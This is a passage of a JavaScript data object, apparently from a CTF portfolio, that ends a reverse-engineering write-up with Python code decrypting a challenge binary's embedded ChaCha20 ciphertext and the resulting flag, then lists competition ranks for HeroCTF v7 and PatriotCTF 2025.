working_state[1], working_state[6], working_state[11], working_state[12] = qr(working_state[1], working_state[6], working_state[11], working_state[12])\n        working_state[2], working_state[7], working_state[8], working_state[13] = qr(working_state[2], working_state[7], working_state[8], working_state[13])\n        working_state[3], working_state[4], working_state[9], working_state[14] = qr(working_state[3], working_state[4], working_state[9], working_state[14])</p>\n<p>return b''.join(struct.pack('<I', (working_state[i] + state[i]) & 0xffffffff) for i in range(16))</p>\n<p>with open(\"challenge\", \"rb\") as f:\n    data = f.read()\n    key = data[0x2080:0x20a0]\n    nonce = data[0x20a0:0x20ac]\n    cipher = data[0x2040:0x2062]</p>\n<p>keystream = chacha20_block(key, 1, nonce)\n    print(bytes(a ^ b for a, b in zip(cipher, keystream)).decode())\n</code>``</p>\n<p>5. The Flag</p>\n<p>Running the script produced the flag:</p>\n<p>flag{iN1_f!ni_Min1_m0...1_$e3_yOu}</p>\n"
            }
        ]
    },
    "HeroCTF v7": {
        "rank": "111th place",
        "description": "Competed in various challenge categories including web exploitation, cryptography, and reverse engineering.",
        "challenges": []
    },
    "PatriotCTF 2025": {
        "rank": "398th place",
        "description": "Comprehensive CTF with diverse challenge categories.",
        "challenges": []
    }
};